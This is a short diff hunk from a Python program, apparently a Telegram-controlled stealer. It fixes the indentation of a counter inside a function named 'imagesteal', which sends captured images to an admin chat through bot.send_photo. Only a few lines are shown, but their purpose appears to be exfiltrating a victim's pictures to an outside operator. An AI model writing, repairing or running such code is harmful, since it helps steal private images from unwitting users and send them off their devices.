@@ -108,7 +108,7 @@ def imagesteal(message):
 				if img is not None:
 					type(img)
 					bot.send_photo(tgadmin,img)
-			a-=1
+					a-=1
 				   
 		except Exception as e:
 			print("ERROR : {0} \n".format(e))
